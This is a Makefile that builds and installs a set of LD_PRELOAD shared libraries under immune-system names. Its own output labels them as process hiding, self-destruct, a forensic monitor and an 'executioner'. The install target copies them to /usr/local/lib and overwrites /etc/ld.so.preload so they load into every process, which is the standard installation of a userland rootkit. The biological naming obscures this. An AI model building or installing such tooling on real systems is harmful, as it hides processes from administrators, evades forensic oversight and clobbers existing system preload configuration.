CC ?= gcc
CFLAGS ?= -fPIC -O2 -Wall -Wextra
LDFLAGS ?= -shared
LDLIBS ?= -ldl -pthread

# Debug flag - set DEBUG=1 to enable debug output
ifdef DEBUG
    CFLAGS += -DDEBUG_MODE=1
else
    CFLAGS += -DDEBUG_MODE=0
endif

# Installation paths
LIBDIR := /usr/local/lib
PRELOAD_FILE := /etc/ld.so.preload
INCIDENT_DIR := /var/log/memory_T_cells

# Immune system evasion
HIDE_SRC := mhc_downreg.c
HIDE_TARGET := mhc_downreg.so
HIDE_OBJ := $(HIDE_SRC:.c=.o)

# Programmed cell death
SELFDELETE_SRC := apoptosis.c
SELFDELETE_TARGET := apoptosis.so
SELFDELETE_OBJ := $(SELFDELETE_SRC:.c=.o)

# Executioner caspases
BIN_TARGET := caspase.o
BIN_SRC := caspase.c

# Forensic monitoring helper T cell
HELPER_T_SRC := helper_T.c
HELPER_T_TARGET := helper_T.so
HELPER_T_OBJ := $(HELPER_T_SRC:.c=.o)

.PHONY: all clean install install-monitor setup-incidents

all: $(HIDE_TARGET) $(SELFDELETE_TARGET) $(BIN_TARGET) $(HELPER_T_TARGET)

$(HIDE_TARGET): $(HIDE_OBJ)
	$(CC) $(LDFLAGS) -o $@ $^ $(LDLIBS)

$(SELFDELETE_TARGET): $(SELFDELETE_OBJ)
	$(CC) $(LDFLAGS) -o $@ $^ $(LDLIBS)

$(HELPER_T_TARGET): $(HELPER_T_OBJ)
	$(CC) $(LDFLAGS) -o $@ $^ $(LDLIBS)

%.o: %.c
	$(CC) $(CFLAGS) -c -o $@ $<

$(BIN_TARGET): $(BIN_SRC)
	$(CC) -o $@ $<

# Setup incident logging directory
setup-incidents:
	@echo "Setting up incident logging directory..."
	@mkdir -p $(INCIDENT_DIR)
	@chmod 755 $(INCIDENT_DIR)
	@echo "Created $(INCIDENT_DIR)"

# Install all components
install: $(HIDE_TARGET) $(SELFDELETE_TARGET) $(BIN_TARGET) $(HELPER_T_TARGET) setup-incidents
	@echo "Installing components to $(LIBDIR)..."
	cp $(HIDE_TARGET) $(LIBDIR)/
	cp $(SELFDELETE_TARGET) $(LIBDIR)/
	cp $(BIN_TARGET) $(LIBDIR)/
	cp $(HELPER_T_TARGET) $(LIBDIR)/
	@echo "Adding to $(PRELOAD_FILE)..."
	echo "$(LIBDIR)/helper_T.so" > $(PRELOAD_FILE)
	echo "$(LIBDIR)/apoptosis.so" >> $(PRELOAD_FILE)
	echo "$(LIBDIR)/mhc_downreg.so" >> $(PRELOAD_FILE)
	ldconfig
	@echo "Installation complete!"
	@echo ""
	@echo "Installed libraries:"
	@echo "  - $(LIBDIR)/mhc_downreg.so (process hiding)"
	@echo "  - $(LIBDIR)/apoptosis.so (self-destruct)"
	@echo "  - $(LIBDIR)/helper_T.so (forensic monitor)"
	@echo "  - $(LIBDIR)/caspase.o (executioner)"
	@echo ""
	@echo "Incident logs will be stored in: $(INCIDENT_DIR)"

clean:
	$(RM) $(HIDE_OBJ) $(HIDE_TARGET) $(SELFDELETE_OBJ) $(SELFDELETE_TARGET) $(BIN_TARGET) $(HELPER_T_OBJ) $(HELPER_T_TARGET)
